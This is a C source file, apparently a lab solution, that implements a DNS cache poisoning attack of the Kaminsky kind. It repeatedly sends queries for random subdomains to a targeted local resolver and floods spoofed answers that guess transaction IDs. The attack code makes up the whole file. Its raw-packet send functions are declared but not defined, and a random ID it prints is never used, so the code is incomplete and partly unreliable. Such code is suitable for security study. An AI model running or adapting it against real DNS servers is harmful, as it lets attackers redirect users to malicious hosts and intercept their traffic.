#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000

/* IP Header */
struct ipheader {
	unsigned char 		iph_ihl:4,		// IP header length
				  		iph_ver:4;		// IP version
	unsigned char		iph_tos; 		// Types of service
	unsigned short int  iph_len;		// IP Packet length (data + header)
	unsigned short int	iph_ident;		// Identification
	unsigned short int	iph_flag:3, 	// Fragmentation flags
						iph_offset:13;	//Flags offset
	unsigned char		iph_ttl;		// time to live
	unsigned char		iph_protocol;	// protocol type
	unsigned short int  iph_chksum;		// IP datagram checksum
	struct 	in_addr		iph_sourceip;	//src IP address
	struct 	in_addr		iph_destip;		//dst IP address
};

void send_raw_packet(char * buffer, int pkt_size);
void send_dns_request(char * buffer, int pkt_size);
void send_dns_response(char * buffer, int pkt_size);

int main()
{
    long i = 0;
    srand(time(NULL));

    //Load the DNS request packet from file
    FILE * f_req = fopen("ip_req.bin", "rb");
    if (!f_req) {
            perror("Can't open 'ip_req.bin'");
            exit(1);
    }
    unsigned char ip_req[MAX_FILE_SIZE];
    int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

    // Load theh first DNS response packet from file
    FILE * f_resp = fopen("ip_resp.bin", "rb");
    if (!f_resp) {
            perror("Cant open 'in resp.bin'");
            exit(1);
    }
    unsigned char ip_resp[MAX_FILE_SIZE];
    int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

	char a[26]="abcdefghijklmnopqrstuvwxyz";
	while(1) {
		unsigned short transaction_id = 0;
		
		// Generate a random name w/ length 5
		char name[5];
		for (int k=0; k<5; k++)	name[k] = a[rand()%26];
				
		/* Step 1. Send  a DNS request to the targeted local DNS server
				   This will trigger it to send out DNS queries */
		memcpy(ip_req+41, name, 5);		//Modify the name in the question field (ofset=41)
		send_dns_request(ip_req, n_req);// send the DNS request
		printf("attempt #%ld. request is [%.5s.example.com]\n, transaction ID is: [%hu]\n", ++i, name, transaction_id);
		
		
		// Step 2. Send spoofed responses to the trageted local DNS server
		memcpy(ip_resp+41, name, 5); // Modify the name in the question field (offset=41)
		memcpy(ip_resp+64, name, 5); // Modify the name in the answer field (offset=64)
		for(int j=0; j<14000; j++)
		{
			transaction_id = (rand()%65536)+1;
			unsigned short id;
			id = htons(j);
			memcpy(ip_resp+28, &id, 2);
			send_dns_response(ip_resp, n_resp);
		}
	}
}
